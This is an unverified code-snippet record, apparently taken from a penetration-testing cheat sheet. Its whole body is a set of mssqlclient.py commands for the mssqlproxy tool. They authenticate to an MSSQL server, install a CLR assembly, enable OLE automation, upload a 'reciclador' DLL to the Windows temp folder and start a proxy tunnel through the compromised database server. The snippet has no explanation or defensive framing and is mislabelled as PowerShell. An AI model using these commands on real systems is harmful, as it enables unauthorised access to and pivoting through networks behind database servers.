---
id: acc9cca6-273b-400e-ada8-5a877e17f82a
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:20.471683+00:00'
updated_at: '2023-04-10T20:36:31.777516+00:00'
---

# Code Snippet acc9cca6

**Language**: Powershell

```powershell
# https://github.com/blackarrowsec/mssqlproxy/blob/master/mssqlclient.py
python3 mssqlclient.py 'host/username:password@10.10.10.10' -install -clr Microsoft.SqlServer.Proxy.dll
python3 mssqlclient.py 'host/username:password@10.10.10.10' -check -reciclador 'C:\windows\temp\reciclador.dll'
python3 mssqlclient.py 'host/username:password@10.10.10.10' -start -reciclador 'C:\windows\temp\reciclador.dll'
SQL> enable_ole
SQL> upload reciclador.dll C:\windows\temp\reciclador.dll
```
